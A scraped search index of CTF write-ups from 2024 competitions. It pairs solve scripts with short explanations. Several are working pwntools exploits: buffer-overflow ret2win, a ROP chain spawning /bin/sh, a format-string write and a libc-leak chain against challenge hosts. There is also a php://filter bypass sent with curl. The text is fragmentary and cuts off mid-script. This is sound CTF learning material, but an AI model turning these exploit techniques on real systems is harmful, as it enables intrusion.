file_get_contents($file); } our input is stored in $file, the “filter” just checks if the file starts with \u003c?php or \u003chtml, we can manage to craft a malicious payload that would bypass the condition. ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:1","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Wrapwrap This is a tool that generates a php://filter chain that adds a prefix and a suffix to the contents of a file. Once you generate the chain, send a post request, I personally used CURL : curl -X POST -d \"file=$(\u003cchain.txt)\" http://websiteorwhatever.com ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:2","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Less suspicious RSA","date":"2024-08-27","objectID":"/less-suspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks less suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 138963980427736364646203557164328211078134463518489686365728312873583832517087170768576679472472907142081360480944201759920246566585465801088226164314480607014663211599932950864391702460227584467326051919881067028851940610382044445003060103566003934601979805899293539507221062915314813557293919231917284247667 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 #print(iter) q = n//p print(q) print(p) n = p*q print(n) ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Computes square root of n -\u003e finds the nearest prime p greater than or equal to the square root -\u003e calculates q as n divided by p -\u003e verifies by recomputing n as p * q. ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Typo","date":"2024-08-27","objectID":"/typo/","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"can you make sure i didn’t make a typo? import random as ran intVar = int('1665663c', 20) ran.seed(intVar) padding = '\\r'r'\\r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'r\\r'r'r\\\\r''r'r'r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'rr\\r''\\r''r''r\\\\'r'\\r''\\r''r\\\\\\r'r'r\\r''\\rr' pay = [ b'arRRrrRRrRRrRRrRr', b'aRrRrrRRrRr', b'arRRrrRRrRRrRr', b'arRRrRrRRrRr', b'arRRrRRrRrrRRrRR' b'arRRrrRRrRRRrRRrRr', b'arRRrrRRrRRRrRr', b'arRRrrRRrRRRrRr' b'arRrRrRrRRRrrRrrrR', ] def lamfunc(y): return bytearray([x - 1 for x in y]) def res(y): return bytearray([x + 1 for x in y]) def handle(hex): for list in range(1, len(hex) - 1, 2): hex[list], hex[list + 1] = hex[list + 1], hex[list] for id in range(0, len(hex) - 1, 2): hex[id], hex[id + 1] = hex[id + 1], hex[id] return hex randres = [handle, lamfunc, res] randres = [ran.choice(randres) for x in range(128)] def reverse(ar_int): chars = \"0123456789abcdefg\" hex_str = '' while ar_int \u003e 0: remainder = ar_int % 17 hex_str = chars[remainder] + hex_str ar_int = ar_int // 17 bytes_ar = bytearray.fromhex(hex_str) return bytes_ar def handle(arr, ar): ar = int(ar, 16) for r in arr[::-1]: ar -= int(r, 35) return reverse(ar) def ran(arr, ar): for r in ar[::-1]: arr = randres[r](arr) return arr re = '5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3' flag = handle(pay,re) randomfunc = ran(flag, padding.encode()) print(randomfunc.decode()) ","date":"2024-08-27","objectID":"/typo/:0:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"Explanation Converts a hexadecimal string to integer -\u003e applies a series of random operations on a byte array based on random choices -\u003e transforms the result back to a byte array and decodes it to a string. ","date":"2024-08-27","objectID":"/typo/:1:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Unsuspicious RSA","date":"2024-08-27","objectID":"/unsuspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 172391551927761576067659307357620721422739678820495774305873584621252712399496576196263035396006999836369799931266873378023097609967946749267124740589901094349829053978388042817025552765214268699484300142561454883219890142913389461801693414623922253012031301348707811702687094437054617108593289186399175149061 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 print(iter) q = nextPrime(p, factorial(90)) print(q) p = n//q print(p) t = nextPrime(p, factorial(90)) print(t==q) print(p*q == n) ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Finds prime factors of a large number n using high-precision arithmetic -\u003e initializes p as the square root of n and finds the nearest prime -\u003e finds the next prime q with a step size of 90 factorial -\u003e calculates p and verifies p * q equals n -\u003e checks if the next prime after p equals q. ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/classic/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Every vulnerability is a door, and some doors lead to treasures. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) win_addr = exe.symbols['win'] # Assuming there's a win function # Print the win function address print(\"win function address: \" + hex(win_addr)) # get the ret address ret_addr = 0x40116C context.log_level = 'debug' # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, # Overwrite return address with win() function address win_addr # Overwrite return address with win() function address ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/classic/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Explanation Simple ret2win, buffer overflow -\u003e ret -\u003e win -\u003e remote shell ","date":"2024-08-27","objectID":"/classic/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/gadgets/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Even the strongest defenses have cracks; find them. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # get the ret address using ropgadget rop = ROP(exe) # pop rdi pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # Print the pop rdi gadget log.info(f\"pop rdi gadget: {hex(pop_rdi)}\") # pop rsi pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] # Print the pop rsi gadget log.info(f\"pop rsi gadget: {hex(pop_rsi)}\") # pop rdx pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] # Print the pop rdx gadget log.info(f\"pop rdx gadget: {hex(pop_rdx)}\") # pop rax pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] # Print the pop rax gadget log.info(f\"pop rax gadget: {hex(pop_rax)}\") # search for bin/sh bin_sh = next(exe.search(b\"/bin/sh\\x00\")) # get syscall address from win function syscall = 0x401159 # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP pop_rax, 0x3b, pop_rdi, bin_sh, pop_rsi, 0, pop_rdx, 0, syscall ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/gadgets/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Explanation Simple ret2syscall, buffer overflow -\u003e control registers (RAX, RDI, RSI, RDX) -\u003e execute syscall -\u003e spawn /bin/sh shell ","date":"2024-08-27","objectID":"/gadgets/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Colored Squares","date":"2024-08-27","objectID":"/colored-squares/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"In the heart of an ancient forest stands a coloured towering tree, its branches adorned with countless doors. Each door, when opened, reveals a labyrinth of branching paths, leading to more doors beyond. As you venture deeper into the maze, the forest seems to come alive with whispered secrets and shifting shadows. With each door opened, the maze expands, presenting new choices and challenges at every turn. Can you understand what’s going on and get out of this maze? from z3 import * flag = BitVecs('v0 v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21', 8) s = Solver() for i in range(len(flag)): s.add(flag[i] \u003e= 48) s.add(flag[i] \u003c= 125) s.add(flag[0] == ord('H')) s.add(flag[1] == ord('T')) s.add(flag[2] == ord('B')) s.add(flag[3] == ord('{')) s.add(flag[21] == ord('}')) # Additional constraints s.add(flag[7] - flag[18] == flag[8] - flag[9]) s.add(flag[6] + flag[10] == flag[16] + flag[20] + 12) s.add(flag[8] * flag[14] == 2 * flag[18] * flag[13]) s.add(flag[19] == flag[6]) s.add(flag[9] + 1 == flag[17] - 1) s.add(flag[11] == 2 * (flag[5] + 7)) s.add(flag[5] + flag[2]/2 == flag[1]) s.add(flag[16] - 9 == flag[13] + 4) s.add(flag[12] == 17 * 3) s.add(flag[4] - flag[5] + flag[12] == flag[14] + 20) s.add(flag[12] * flag[15] == 24 * flag[14]) s.add(flag[18] + flag[4] == 173) s.add(flag[6] == flag[5] + 63) s.add(flag[16] * 32 == flag[0] * flag[7]) s.add(flag[17] - flag[15] == flag[18] + 1) s.add(flag[20] == ord('s')) if s.check() == sat: m = s.model() result = ''.join([chr(m.evaluate(flag[i]).as_long()) for i in range(len(flag))]) print(\"Flag:\", result) else: print(\"No solution found.\") ","date":"2024-08-27","objectID":"/colored-squares/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"Explanation Solves for a 22-character flag using Z3 solver -\u003e imposes constraints on flag characters -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/colored-squares/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored Squares","uri":"/colored-squares/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Delulu","date":"2024-08-27","objectID":"/delulu/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Delulu is a very easy difficulty challenge that features format string vulnerability, overwriting a variable’s value. from pwn import * #nc 83.136.251.235 53824 # Start the process p = process('./delulu') #nc 94.237.49.116 55529 #p = remote('94.237.51.233',44897) gdb.attach(p, gdbscript=\"b *main+134\\n continue\") print(p.recv().decode()) pay = b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' #pay += b'\\xf8\\xdd\\xff\\xff\\xff\\x7f' pay += b'%7$n' #pay += b'%48867x%7$hn%48879x%8$hn' # Send the payload without a newline p.send(pay) print(p.recvall()) ","date":"2024-08-27","objectID":"/delulu/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"Explanation Starts a local process of delulu binary for exploitation -\u003e attaches gdb for debugging and sets a breakpoint -\u003e creates a format string payload to write data to a specified address -\u003e sends the payload to the process and prints the output. ","date":"2024-08-27","objectID":"/delulu/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Delulu","uri":"/delulu/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Metagaming","date":"2024-08-27","objectID":"/metagaming/","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"You come across an enemy faction, who have banded together and gathered their resources. You’ll need to outwit them, thinking outside the box- can you beat them before they even begin to run? from z3 import * payload = [ [12,13,10], [21,0,0], [0,13,13], [0,14,0], [15,11,12], [24,14,0], [5,0,14], [0,14,1], [7,11,11], [24,14,8], [5,0,14], [0,14,2], [2,10,11], [24,14,16], [18,12,11], [5,0,14], [0,14,3], [0,11,11], [24,14,24], [13,10,10], [5,0,14], [2,11,13], [21,1,0], [0,14,4], [24,14,0], [5,1,14], [6,11,12], [0,14,5], [8,10,10], [24,14,8], [11,12,11], [5,1,14], [0,14,6], [0,12,10], [24,14,16], [9,10,13], [5,1,14], [0,14,7], [13,12,12], [24,14,24], [15,10,12], [5,1,14], [21,2,0], [20,13,13], [0,14,8], [24,14,0], [19,10,11], [5,2,14], [6,12,10], [0,14,9], [8,11,11], [24,14,8], [5,2,14], [0,14,10], [4,11,12], [24,14,16], [5,2,14], [0,14,11], [24,14,24], [4,13,12], [5,2,14], [21,3,0], [14,10,12], [0,14,12], [13,10,11], [24,14,0], [16,10,10], [5,3,14], [5,11,12], [0,14,13], [12,10,13], [24,14,8], [2,10,13], [5,3,14], [20,11,11], [0,14,14], [24,14,16], [18,13,11], [5,3,14], [6,11,13], [0,14,15], [24,14,24], [4,11,10], [5,3,14], [21,4,0], [15,13,11], [0,14,16], [6,10,10], [24,14,0], [14,10,12], [5,4,14], [0,14,17], [12,13,13], [24,14,8], [19,11,10], [5,4,14], [0,14,18], [17,13,12], [24,14,16], [5,4,14], [0,14,19], [24,14,24], [21,12,10], [5,4,14], [13,13,10], [21,5,0], [0,14,20], [19,10,13], [24,14,0], [5,5,14], [0,14,21], [24,14,8], [8,13,13], [5,5,14], [0,14,22], [16,13,11], [24,14,16], [10,10,13], [5,5,14], [7,10,12], [0,14,23], [19,13,10], [24,14,24], [5,5,14], [17,12,10], [21,6,0], [16,11,10], [0,14,24], [24,14,0], [10,11,10], [5,6,14], [0,14,25], [24,14,8], [7,10,12], [5,6,14], [0,14,26], [16,12,11], [24,14,16], [3,11,10], [5,6,14], [15,11,13], [0,14,27], [4,12,13], [24,14,24], [5,6,14], [14,11,13], [21,7,0], [0,14,28], [21,13,11], [24,14,0], [7,12,11], [5,7,14], [17,11,10], [0,14,29], [24,14,8], [5,7,14], [0,14,30], [12,10,10], [24,14,16], [5,7,14], [0,14,31], [20,10,10], [24,14,24], [5,7,14], [21,8,0], [18,10,12], [0,14,32], [9,11,11], [24,14,0], [21,12,11], [5,8,14], [0,14,33], [24,14,8], [19,10,13], [5,8,14], [8,12,13], [0,14,34], [24,14,16], [5,8,14], [8,10,10], [0,14,35], [24,14,24], [21,13,10], [5,8,14], [0,12,10], [21,9,0], [0,14,36], [24,14,0], [5,9,14], [17,11,11], [0,14,37], [14,10,13], [24,14,8], [5,9,14], [4,10,11], [0,14,38], [13,11,13], [24,14,16], [5,9,14], [0,14,39], [10,11,10], [24,14,24], [20,13,13], [5,9,14], [6,12,11], [21,14,0], [8,0,2769503260], [10,0,997841014], [19,12,11], [2,0,4065997671], [5,13,11], [8,0,690011675], [15,11,11], [8,0,540576667], [2,0,1618285201], [8,0,1123989331], [8,0,1914950564], [8,0,4213669998], [21,13,11], [8,0,1529621790], [10,0,865446746], [2,10,11], [8,0,449019059], [16,13,11], [8,0,906976959], [6,10,10], [8,0,892028723], [10,0,1040131328], [2,0,3854135066], [2,0,4133925041], [2,0,1738396966], [2,12,12], [8,0,550277338], [10,0,1043160697], [2,1,1176768057], [10,1,2368952475], [8,12,11], [2,1,2826144967], [8,1,1275301297], [10,1,2955899422], [2,1,2241699318], [12,11,10], [8,1,537794314], [11,13,10], [8,1,473021534], [17,12,13], [8,1,2381227371], [10,1,3973380876], [10,1,1728990628], [6,11,13], [8,1,2974252696], [0,11,11], [8,1,1912236055], [2,1,3620744853], [3,10,13], [2,1,2628426447], [11,13,12], [10,1,486914414], [16,11,12], [10,1,1187047173], [14,12,11], [2,2,3103274804], [13,10,10], [8,2,3320200805], [8,2,3846589389], [1,13,13], [2,2,2724573159], [10,2,1483327425], [2,2,1957985324], [14,13,12], [10,2,1467602691], [8,2,3142557962], [2,13,12], [2,2,2525769395], [8,2,3681119483], [8,12,11], [10,2,1041439413], [10,2,1042206298], [2,2,527001246], [20,10,13], [10,2,855860613], [8,10,10], [8,2,1865979270], [1,13,10], [8,2,2752636085], [2,2,1389650363], [10,2,2721642985], [18,10,11], [8,2,3276518041], [15,10,10], [2,2,1965130376], [2,3,3557111558], [2,3,3031574352], [16,12,10], [10,3,4226755821], [8,3,2624879637], [8,3,1381275708], [2,3,3310620882], [2,3,2475591380], [8,3,405408383], ","date":"2024-08-27","objectID":"/metagaming/:0:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"Explanation Solves for a 40-character flag using Z3 solver -\u003e imposes constraints on flag characters and register values -\u003e executes instructions to transform registers -\u003e ensures final register values match specified values -\u003e finds valid flag satisfying all conditions. ","date":"2024-08-27","objectID":"/metagaming/:1:0","tags":["REVERSE","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Metagaming","uri":"/metagaming/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - QuickScan","date":"2024-08-27","objectID":"/quickscan/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"QuickScan is a Medium reversing challenge. Players will be sent a series of small, randomly generated ELF files and must rapidly and automatically anlalyse them in order to extract required data. from pwn import * #94.237.62.48 32757 p = remote('94.237.62.48',32757) m = (p.recv()) print(m.decode()) def find_substring_index(string, substring): index = string.find(substring) + len(substring) return index while True: start_index = m.find(b\"ELF: \") + len(b\"ELF: \") end_index = m.find(b\"\\n\", start_index) elf_data_base64 = m[start_index:end_index] # Decode base64-encoded ELF data elf_data = base64.b64decode(elf_data_base64) hexxer = elf_data.hex() substring = \"488d35\" index = find_substring_index(hexxer, substring) padding = int.from_bytes(bytes.fromhex(hexxer[index:index+8]), byteorder='little', signed=True)*2 start = index+8 end = start+padding r = hexxer[end:end+48] print(hexxer) p.sendline(r) m = p.recv() print(m.decode()) ","date":"2024-08-27","objectID":"/quickscan/:0:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"Explanation Decodes ELF binary from Base64 -\u003e converts to hex -\u003e finds substring index for opcode I forgot about -\u003e calculates padding -\u003e extracts and prints portion of hex data based on padding. ","date":"2024-08-27","objectID":"/quickscan/:1:0","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - QuickScan","uri":"/quickscan/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","date":"2024-08-27","objectID":"/writing-on-the-wall/","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets? from pwn import * #nc 83.136.251.235 53824 # Start the process #p = process('./writing_on_the_wall') p = remote('83.136.251.235',53824) #gdb.attach(p, gdbscript=\"b *main+77\\n continue\") print(p.recv().decode()) # Send the payload without a newline p.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00') print(p.recvall().decode()) ","date":"2024-08-27","objectID":"/writing-on-the-wall/:0:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"Explanation 9 null bytes to manipulate the data ","date":"2024-08-27","objectID":"/writing-on-the-wall/:1:0","tags":["PWN","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Writing on the Wall","uri":"/writing-on-the-wall/"},{"categories":["Writeups"],"content":"Writeup for Q4N1 challenge.","date":"2024-08-27","objectID":"/circuits/","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for Quantum challenge from MCSC 2024. from qiskit import QuantumCircuit, execute, Aer # Create a quantum circuit with 7 qubits and 7 classical bits circuit = QuantumCircuit(7, 7) # Apply the gates from your OPENQASM code circuit.cz(2, 4) circuit.z(2) circuit.cy(2, 4) # ... (add the remaining gates) # Measure all qubits circuit.measure(range(7), range(7)) # Choose a backend (simulator or real quantum computer) simulator = Aer.get_backend('qasm_simulator') # Execute the circuit and get the counts job = execute(circuit, backend=simulator, shots=1024) # Increase shots for better statistics counts = job.result().get_counts() # Print the measurement results print(counts) ","date":"2024-08-27","objectID":"/circuits/:0:0","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Explanation You create a quantum circuit with 7 qubits and 7 classical bits, where quantum operations are performed on the qubits, and the classical bits store the measurement results. Several quantum gates are applied, including a controlled-Z gate (cz) where qubit 2 controls qubit 4, a Z gate that flips the phase of qubit 2, and a controlled-Y gate (cy) with qubit 2 as the control and qubit 4 as the target. After adding the necessary gates, all 7 qubits are measured, with the results stored in the corresponding classical bits. The circuit is then simulated using the qasm_simulator backend, which mimics a real quantum computer. The circuit is executed 1024 times to gather statistical outcomes, and the measurement results are retrieved and displayed as a dictionary, showing the frequency of each possible outcome in binary form. ","date":"2024-08-27","objectID":"/circuits/:1:0","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Q4N1","uri":"/circuits/"},{"categories":["Writeups"],"content":"Writeup for zipbomb challenge.","date":"2024-08-27","objectID":"/zipbomb/","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Writeup for Zipbomb challenge from MCSC 2024. import base64 import string import gzip import binascii import io import py7zr import os import re brail=\"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" strings = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%\u0026'()*+,-./:;\u003c=\u003e?@[\\\\]^_\" def contains_braille(text): brail = \"⠴⠂⠆⠒⠲⠢⠖⠶⠦⠔⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠁⠃⠉⠙⠑⠋⠛⠓⠊⠚⠅⠇⠍⠝⠕⠏⠟⠗⠎⠞⠥⠧⠺⠭⠽⠵⠮⠐⠼⠫⠩⠯⠄⠷⠾⠡⠬⠠⠤⠨⠌⠱⠰⠣⠿⠜⠹⠈⠪⠳⠻⠘⠸\" for char in text: if char in brail: return True return False def contains_hexadecimal(text): return all(c in string.hexdigits for c in text) def contains_non_printables(text): # Iterate over each character in the text for char in text: # Check if the character is non-printable or matches specific value like 'ÿ' if not char.isprintable(): return True # If no non-printable characters are found, return False return False def convertbraille(text): result = \"\" for char in text: result += strings[brail.index(char)] return result def hex_to_string(hex_str): try: # Convert hexadecimal string to bytes hex_bytes = bytes.fromhex(hex_str) # Convert bytes to string return hex_bytes.decode('ascii') except Exception as e: print(\"Error:\", e) return None def gunzip_bytes_obj(text): text = text.encode('latin1') text = gzip.GzipFile(fileobj=io.BytesIO(text), mode='rb') text = text.read().decode('utf-8') return text def is_base32(s): # Define the Base32 alphabet s=s.upper() print(s) base32_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567' # Check if all characters in the string are part of the Base32 alphabet for char in s: if char not in base32_alphabet: if char==\"=\": return True return False return True def extract_7z_with_password(archive_path, output_dir, password): try: # Open the 7z archive with the provided password with py7zr.SevenZipFile(archive_path, mode='r', password=password) as z: # Extract all files to the specified output directory z.extractall(path=output_dir) print(f\"Extraction of {archive_path} successful!\") os.chdir(output_dir) except Exception as e: print(f\"Extraction of {archive_path} failed:\", e) def extract_from_directory(directory, output_dir, password): # Iterate through files in the directory for filename in os.listdir(directory): if filename.endswith(\".7z\"): # Check if the file ends with \".7z\" # Construct the full path to the 7z archive archive_path = os.path.join(directory, filename) # Attempt to extract the 7z archive extract_7z_with_password(archive_path, output_dir, password) #while True: i=1 while True: with open('crack_me', 'r',encoding='utf-8') as file: # Read the entire contents of the file text = file.read() with open('backup_me', 'x',encoding='utf-8') as file: file.write(text) # Now 'text' contains the contents of the file while (type(text) == str): if contains_braille(text): text=convertbraille(text) elif contains_non_printables(text): text=gunzip_bytes_obj(text) elif contains_hexadecimal(text): text = ''.join([chr(int(text[i:i+2], 16)) for i in range(0, len(text), 2)]) else : text=text.upper() text = base64.b32decode(text).decode('utf-8') print(text,end=\"\\n\\n\") if len(text) \u003c= len(\"SKOWJUHYISBWNOQMZUOQOZXZPOTVAW\") : if contains_braille(text)==False: break text=text.upper() extract_from_directory('.', './'+str(i), text) i+=1 ","date":"2024-08-27","objectID":"/zipbomb/:0:0","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"Explanation It’s a simple automation of the decoding steps The logic goes : detect if it’s braille hex or gunzipped, decode it, cd to the new directory,rinse and repeat. ","date":"2024-08-27","objectID":"/zipbomb/:1:0","tags":["MISC","MCSC","2024"],"title":"MCSC 2024 - Zipbomb","uri":"/zipbomb/"},{"categories":["Writeups"],"content":"CygenixCTF - Chain it","date":"2024-08-26","objectID":"/chainit/","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Where there is code, there is a way in. #setup pwntools from pwn import * context(arch='amd64', os='linux') #setup binary exe = ELF('./main') p = process(exe.path) context.log_level = \"critical\" #nc 134.209.150.149 4444 p = remote(\"134.209.150.149\", 4444) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) id_addr = exe.symbols['id'] # Assuming there's a win function # Print the win function address print(\"id function address: \" + hex(id_addr)) # Addresses ret_addr = 0x0000000000401016 pop_rdi = 0x000000000040115a #GOT puts_got = exe.got['puts'] #PLT puts_plt = exe.plt['puts'] #main main = exe.symbols['main'] #payload to leak puts payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address puts_got, # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() puts_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"puts@GLIBC: {hex(puts_leak)}\") #leak gets payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address exe.got['gets'], # Overwrite return address with win() function address puts_plt, main ) # Send the payload p.sendline(payload) p.recvline() p.recvline() p.recvline() gets_leak = u64(p.recvline().strip().ljust(8, b\"\\x00\")) print(f\"gets@GLIBC: {hex(gets_leak)}\") #download libc libc_filename = libcdb.search_by_symbol_offsets({'puts': puts_leak, 'gets': 